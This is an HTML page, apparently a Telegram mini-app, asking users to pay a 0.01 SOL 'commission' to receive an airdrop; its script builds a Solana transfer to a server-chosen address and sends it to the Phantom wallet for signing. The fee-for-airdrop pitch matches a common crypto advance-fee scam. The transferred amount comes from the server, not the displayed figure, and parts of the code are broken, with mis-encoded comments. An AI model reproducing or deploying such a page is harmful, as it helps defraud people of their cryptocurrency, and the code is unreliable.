<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pay Commission</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <script src="https://unpkg.com/tweetnacl@1.0.3/nacl-fast.min.js"></script>
    <script src="https://unpkg.com/bs58@4.0.1/index.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #000; color: #fff; min-height: 100vh;
            display: flex; align-items: center; justify-content: center; padding: 20px;
        }

        .container { text-align: center; max-width: 400px; width: 100%; }
        .logo { width: 80px; height: 80px; background: #ffa500; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 30px; color: #000; }
        h1 { font-size: 24px; margin-bottom: 10px; font-weight: 600; }
        .subtitle { color: #999; margin-bottom: 30px; font-size: 16px; }

        .pay-btn {
            background: #ffa500; color: #000; border: none; padding: 15px 30px; border-radius: 10px;
            font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; margin-bottom: 20px;
            transition: all 0.3s ease;
        }
        .pay-btn:hover { background: #ff8c00; transform: translateY(-2px); }
        .pay-btn:disabled { background: #333; color: #666; cursor: not-allowed; transform: none; }

        .amount-info {
            background: #1a1a1a; border: 2px solid #333; border-radius: 10px;
            padding: 20px; margin: 20px 0;
        }

        .status { margin-top: 20px; padding: 15px; border-radius: 10px; display: none; }
        .status.success { background: #1a5f1a; color: #90ee90; border: 1px solid #228b22; }
        .status.error { background: #5f1a1a; color: #ffb3b3; border: 1px solid #dc3545; }

        .loading { display: none; margin-top: 20px; }
        .spinner { width: 20px; height: 20px; border: 2px solid #333; border-top: 2px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">ðŸ’°</div>
        <h1>Pay Commission</h1>
        <p class="subtitle">Pay the required commission to complete airdrop</p>

        <div class="amount-info">
            <h3>Commission Amount</h3>
            <div style="font-size: 24px; color: #ffa500; margin: 10px 0;">0.01 SOL</div>
            <p style="color: #999; font-size: 14px;">This commission is required to process your airdrop.</p>
        </div>

        <button id="payBtn" class="pay-btn" onclick="payCommission()">
            ðŸ’³ Pay for Commission
        </button>

        <div id="loading" class="loading">
            <div class="spinner"></div>
            <p style="margin-top: 10px;">Processing payment...</p>
        </div>

        <div id="status" class="status"></div>
    </div>

    <script>
        const USER_ID = new URLSearchParams(window.location.search).get('telegram_id') ||
                       window.Telegram?.WebApp?.initDataUnsafe?.user?.id ||
                       'guest';

        let isProcessing = false;
        let dappKeyPair = null;

        // ØªÙˆÙ„ÛŒØ¯ Ú©Ù„ÛŒØ¯ Ø¬ÙØª Ø¨Ø±Ø§ÛŒ Ø±Ù…Ø²Ù†Ú¯Ø§Ø±ÛŒ
        function generateDappKeyPair() {
            dappKeyPair = nacl.box.keyPair();
            return bs58.encode(dappKeyPair.publicKey);
        }

        // Ø±Ù…Ø²Ú¯Ø°Ø§Ø±ÛŒ payload
        function encryptPayload(payload, sharedSecret) {
            const nonce = nacl.randomBytes(24);
            const encryptedPayload = nacl.box.after(
                new TextEncoder().encode(JSON.stringify(payload)),
                nonce,
                sharedSecret
            );
            return [nonce, encryptedPayload];
        }

        async function payCommission() {
            if (isProcessing) return;

            const payBtn = document.getElementById('payBtn');
            const loading = document.getElementById('loading');
            const status = document.getElementById('status');

            try {
                isProcessing = true;
                payBtn.disabled = true;
                payBtn.textContent = 'Preparing Payment...';
                status.style.display = 'none';

                // Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ù¾Ø±Ø¯Ø§Ø®Øª Ø§Ø² Ø³Ø±ÙˆØ±
                const response = await fetch('/api/commission/pay', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ telegram_id: USER_ID })
                });

                const paymentData = await response.json();

                if (!paymentData.success) {
                    throw new Error(paymentData.error);
                }

                // Ø§ÛŒØ¬Ø§Ø¯ Ú©Ù„ÛŒØ¯ Ø¨Ø±Ø§ÛŒ Ø±Ù…Ø²Ù†Ú¯Ø§Ø±ÛŒ
                const dappPublicKey = generateDappKeyPair();
                const amount = Math.floor(paymentData.amount * 1000000000); // ØªØ¨Ø¯ÛŒÙ„ SOL Ø¨Ù‡ lamports
                const recipientAddress = paymentData.recipient;

                payBtn.textContent = 'Creating Transaction...';

                // Ø§ÛŒØ¬Ø§Ø¯ ØªØ±Ø§Ú©Ù†Ø´ SOL transfer
                const connection = new solanaWeb3.Connection('https://api.devnet.solana.com');
                
                // ÙØ±Ø¶ Ù…ÛŒâ€ŒÚ©Ù†ÛŒÙ… Ú©ÛŒÙ Ù¾ÙˆÙ„ Ú©Ø§Ø±Ø¨Ø± Ø§Ø² session ÛŒØ§ localStorage Ø¨ÛŒØ§ÛŒØ¯
                const userWalletPublicKey = localStorage.getItem('phantom_public_key') || 'PLACEHOLDER_WALLET';
                
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: new solanaWeb3.PublicKey(userWalletPublicKey),
                        toPubkey: new solanaWeb3.PublicKey(recipientAddress),
                        lamports: amount
                    })
                );

                // Ø¯Ø±ÛŒØ§ÙØª recent blockhash
                const { blockhash } = await connection.getRecentBlockhash();
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = new solanaWeb3.PublicKey(userWalletPublicKey);

                // Serialize transaction
                const serializedTransaction = transaction.serialize({
                    requireAllSignatures: false,
                    verifySignatures: false
                });

                // Ø§ÛŒØ¬Ø§Ø¯ payload Ø¨Ø±Ø§ÛŒ Phantom
                const payload = {
                    session: localStorage.getItem('phantom_session') || 'temp_session',
                    transaction: bs58.encode(serializedTransaction)
                };

                // Ø§ÛŒØ¬Ø§Ø¯ Ø´Ù†Ø§Ø³Ù‡ ÛŒÚ©ØªØ§ Ø¨Ø±Ø§ÛŒ Ø§ÛŒÙ† ØªØ±Ø§Ú©Ù†Ø´
                const nonce = nacl.randomBytes(24);

                // Callback URL Ø¨Ø±Ø§ÛŒ Ø¨Ø§Ø²Ú¯Ø´Øª
                const callbackUrl = `${window.location.origin}/commission/callback?telegram_id=${USER_ID}`;

                // Ù¾Ø§Ø±Ø§Ù…ØªØ±Ù‡Ø§ÛŒ Deep Link
                const params = new URLSearchParams({
                    dapp_encryption_public_key: dappPublicKey,
                    cluster: 'devnet',
                    app_url: window.location.origin,
                    redirect_link: callbackUrl,
                    nonce: bs58.encode(nonce),
                    payload: bs58.encode(new TextEncoder().encode(JSON.stringify(payload)))
                });

                // Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² signTransaction Ø¨Ù‡ Ø¬Ø§ÛŒ signAndSendTransaction
                const phantomUrl = `phantom://v1/signTransaction?${params.toString()}`;

                console.log('Opening Phantom with URL:', phantomUrl);

                payBtn.textContent = 'Opening Phantom App...';
                
                // Ù…Ø³ØªÙ‚ÛŒÙ…Ø§Ù‹ Ø¨Ø§ Phantom deeplink
                setTimeout(() => {
                    window.location.href = phantomUrl;
                }, 500);

                // Ù†Ù…Ø§ÛŒØ´ Ø­Ø§Ù„Øª Ø§Ù†ØªØ¸Ø§Ø±
                setTimeout(() => {
                    payBtn.style.display = 'none';
                    loading.style.display = 'block';
                    
                    // Ø´Ø±ÙˆØ¹ Ø¨Ø±Ø±Ø³ÛŒ ÙˆØ¶Ø¹ÛŒØª Ù¾Ø±Ø¯Ø§Ø®Øª
                    setTimeout(checkPaymentStatus, 5000);
                }, 1000);

            } catch (error) {
                console.error('Payment error:', error);
                showStatus('error', `âŒ Payment failed: ${error.message}`);
                resetPayment();
            }
        }

        async function checkPaymentStatus() {
            try {
                const response = await fetch(`/api/commission/status?telegram_id=${USER_ID}`);
                const data = await response.json();

                if (data.paid) {
                    showStatus('success', 'âœ… Payment completed successfully!');
                    
                    setTimeout(() => {
                        if (window.Telegram?.WebApp) {
                            window.Telegram.WebApp.close();
                        } else {
                            window.location.href = `/airdrop?telegram_id=${USER_ID}`;
                        }
                    }, 2000);
                } else {
                    // Ø§Ø¯Ø§Ù…Ù‡ Ø¨Ø±Ø±Ø³ÛŒ
                    setTimeout(checkPaymentStatus, 3000);
                }
            } catch (error) {
                console.error('Check payment error:', error);
                
                // Ø§Ú¯Ø± Ø¨Ø¹Ø¯ Ø§Ø² 30 Ø«Ø§Ù†ÛŒÙ‡ Ù‡Ù†ÙˆØ² Ù¾Ø±Ø¯Ø§Ø®Øª ØªØ§ÛŒÛŒØ¯ Ù†Ø´Ø¯
                setTimeout(() => {
                    showStatus('error', 'ðŸ” Payment verification timeout. Please try again.');
                    resetPayment();
                }, 30000);
            }
        }

        function resetPayment() {
            isProcessing = false;
            document.getElementById('payBtn').disabled = false;
            document.getElementById('payBtn').textContent = 'ðŸ’³ Pay for Commission';
            document.getElementById('payBtn').style.display = 'block';
            document.getElementById('loading').style.display = 'none';
        }

        function showStatus(type, message) {
            const status = document.getElementById('status');
            status.className = `status ${type}`;
            status.textContent = message;
            status.style.display = 'block';
        }

        // Ø¨Ø±Ø±Ø³ÛŒ Ù¾Ø§Ø±Ø§Ù…ØªØ±Ù‡Ø§ÛŒ URL Ø¨Ø±Ø§ÛŒ Ù†ØªÛŒØ¬Ù‡ Ù¾Ø±Ø¯Ø§Ø®Øª
        function checkUrlParams() {
            const urlParams = new URLSearchParams(window.location.search);
            const signature = urlParams.get('signature');
            const errorCode = urlParams.get('errorCode');

            if (signature) {
                showStatus('success', 'âœ… Payment completed successfully!');
                setTimeout(() => {
                    if (window.Telegram?.WebApp) {
                        window.Telegram.WebApp.close();
                    } else {
                        window.location.href = `/airdrop?telegram_id=${USER_ID}`;
                    }
                }, 2000);
            } else if (errorCode) {
                showStatus('error', `âŒ Payment failed: ${errorCode}`);
                resetPayment();
            }
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            if (window.Telegram?.WebApp) {
                window.Telegram.WebApp.ready();
                window.Telegram.WebApp.expand();
                window.Telegram.WebApp.BackButton.show();
                window.Telegram.WebApp.BackButton.onClick(() => {
                    window.Telegram.WebApp.close();
                });
            }

            // Ø¨Ø±Ø±Ø³ÛŒ Ù¾Ø§Ø±Ø§Ù…ØªØ±Ù‡Ø§ÛŒ URL
            checkUrlParams();
        });
    </script>
</body>
</html>
